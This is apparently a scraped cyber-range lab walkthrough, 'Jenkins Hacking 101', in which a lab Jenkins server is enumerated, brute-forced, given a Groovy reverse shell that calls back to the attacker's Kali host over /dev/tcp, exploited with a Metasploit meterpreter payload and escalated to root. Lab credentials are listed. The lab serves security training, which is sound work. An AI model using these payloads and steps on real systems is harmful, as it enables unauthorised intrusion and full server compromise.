@@ -1,0 +1,288 @@
+Timestamp: 2025-12-29T18:58:55.691371
+URL: https://app.cyberranges.com/instance/start/6952b345dabdba0ee85a7752
+Title: Loading Scenario - CYBER RANGES
+Hash: 871a896ca9a25d05cbb101c21cfecff1dcb966e667171d26ce258df9666c6a11
+================================================================================
+MISSION
+RULES
+LEADERBOARD
+VPN
+JENKINS HACKING 101
+
+Jenkins is an open source and one of the most widely used automation servers in DevOps, helping organizations streamline software development through continuous integration (CI) and continuous delivery (CD). However, with great automation comes great security risks—Jenkins, if misconfigured or exposed, can be a prime target for attackers.
+
+In this lab, we’ll step into the shoes of an ethical hacker, exploring how Jenkins can be compromised and what security weaknesses to look out for.
+
+
+The key functionalities are as follows:
+
+Automation:
+
+Jenkins automates the parts of software development related to building, testing, and deploying, doing continuous integration and delivery.
+
+Plugins:
+
+Jenkins supports over 1,800 plugins, which extend its functionality to integrate with various tools and platforms such as Git, Maven, Docker, Kubernetes, and more.
+
+Pipeline:
+
+Jenkins enables the creation of complex CI/CD pipelines using a domain-specific language (DSL) called Groovy.
+
+The pipelines does all the steps to build, test, and deploy applications.
+
+Distributed Builds:
+
+Jenkins supports distributed builds, allowing tasks to be executed across multiple machines to speed up the development process.
+
+Extensibility:
+
+Jenkins can be extended with plugins, making it very useful for many projects and workflows.
+
+Open Source:
+
+Being open source, Jenkins is free to use and has a large and active community contributing to its development and support.
+
+Common Jenkins Endpoints
+
+Below are some common Jenkins endpoints:
+
+/login - The login page for Jenkins
+
+/user/* - User-specific pages
+
+/job/* - Job-specific pages
+
+/view/* - View-specific pages
+
+/pluginManager/* - Plugin manager interface
+
+/computer/* - Nodes (agents) management interface
+
+/script - Script Console (if accessible)
+
+/credentials/* - Credentials management
+
+LAB ACCESS GUIDELINES
+
+To support the completion of this scenario, you are provided with a Kali VM that can be used for receiving reverse connections.
+
+Browser-based access is provided via the web service for GUI and SSH service for webshell.
+
+VM
+
+	
+
+IP
+
+	
+
+Username
+
+	
+
+Password
+
+
+
+
+Kali
+
+	
+
+192.168.125.100
+
+	
+
+rangeadmin
+
+	
+
+password_CR1
+
+
+
+
+Jenkins Server
+
+	
+
+192.168.125.200:8080
+
+	
+
+N/A
+
+	
+
+N/A
+
+For VPN access steps see the Rules section.
+
+Jenkins - Enumeration
+
+Our target IP is 192.168.125.200 hosted on port 8080.
+
+We will start by scanning with the Nmap:
+
+nmap -sV 192.168.125.200
+
+We managed to discover that port 8080 is opened and running a jetty web server.
+
+Jetty is an open-source project providing an HTTP server, HTTP client, and Javax.servlet container. This means a Jenkins server is hosted in a Java environment servlet in that machine.
+
+We can check manually on the browser and open the IP target.
+
+http://192.168.125.200:8080/login?from=%2F
+
+The image above shows the Jenkins instance login interface on the web.
+
+Without credentials, we should look manually (or using Metasploit) inside /asynchPeople/ path or /securityRealm/user/admin/search/index?q= for usernames.
+
+Let's open msfconsole -q to enumerate more using the Metasploit framework.
+
+We will use the Metasploit jenkins_enum module to enumerate :
+
+use auxiliary/scanner/http/jenkins_enum
+set RHOSTS 192.168.125.200
+set RPORT 8080
+run
+
+The version found is 2.452.3.
+
+Use module jenkins_command to check if we can execute commands without authentication:
+
+use auxiliary/scanner/http/jenkins_command
+set RHOSTS 192.168.125.200
+set RPORT 8080
+set TARGETURI /
+run
+
+Note: Even if you use the command set TARGETURI /still we dont get anything back which means not vulnerable.
+
+Jenkins - Brute Force
+
+Jenkins doesn't implement any password policy or mitigation.
+
+We should always try to brute-force users because they may have weak passwords and usernames.
+
+Note: I have put the useranmes.txt and the passwords.txt custom wordlist in the Documents directory for brute-force usage.
+
+use auxiliary/scanner/http/jenkins_login
+set RHOSTS 192.168.125.200
+set USER_FILE /home/rangeadmin/Documents/usernames.txt
+set PASS_FILE /home/rangeadmin/Documents/passwords.txt
+set LOGIN_URL /j_spring_security_check
+set VERBOSE false
+run
+
+We have successfully found the username and password to log in.
+
+Note: About the /j_spring_security_check directory was discovered by using burpsuite while intercepting the login page. Different jenkins may have different directory names like j_spring_security_check or j_acegi_security_check that was the default one in the module. Remmember that puting the wrong directory in this module can result in wrong results.
+
+Jenkins - Manually Exploitation
+
+Log in now using the username and password we found.
+
+http://192.168.125.200:8080/login?from=%2F
+
+Username: jackson
+Password: 123123
+
+Click on the Manage Jenkins button.
+
+Then go to the end in the Tools and Actions section and click Script Console.
+
+Script Console can help us execute commands to put a reverse shell payload from here.
+
+First, we will open a netcat listener:
+
+nc -nlvp 4444
+
+Then using the below reverse shell payload put it in the field of the script console:
+
+The below Groovy script snippet is designed to open a reverse shell from the Jenkins server to a remote machine.
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/192.168.125.100/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+
+whoami
+id
+ls
+
+If we go back to the netcat listener to get a successful connection.
+
+Jenkins - MSF Exploit
+
+We can also use the Metasploit module to get a shell more easily.
+
+Set the below-required options:
+
+use exploit/multi/http/jenkins_script_console
+set TARGET 1
+set payload linux/x64/meterpreter/reverse_tcp
+set RHOSTS 192.168.125.200
+set RPORT 8080
+set TARGETURI /
+set username jackson
+set password 123123
+exploit
+
+
+
+sysinfo
+
+We Successfully managed to get a low-privileged shell and we need to use priv-esc module local_exploit_suggester to try to elevate our privileges :
+
+Ideally, this is a post-exploitation module that analyzes the target system and suggests potential privilege escalation exploits.
+
+It works by checking system details (kernel version, OS type, patches, etc.) against known local privilege escalation vulnerabilities.
+
+NB: Background the session with ctrl + z and type 'y' for yes.
+
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+The exploit suggester module runs on the session we got as a Jenkins user and finds some possible exploits but not all of them work.
+
+We are going to use su_login module:
+
+use exploit/linux/local/su_login
+set SESSION 1
+set LHOST 192.168.125.100
+exploit
+
+
+
+
+
+sysinfo
+
+Now since we got another meterpreter session we do shell command.
+
+shell
+whoami
+
+We successfully managed to elevate our privileges/shell to root.
+
+Again, I terminate with ctrl + c and then ctrl + z to background from meterpreter.
+
+To check for the session list do:
+
+sessions -l
+
+You can see 2 sessions available one in root privileges and the other as a simple user.
+
+CONCLUSION
+
+We have successfully learned how to hack the basics of Jenkins and gain a root shell.
+
+Go ahead and answer the questions provided.
+
+Hacking Jenkins
+By Franko Janku
+Loading...
+Loading 2%
+4m 19s left
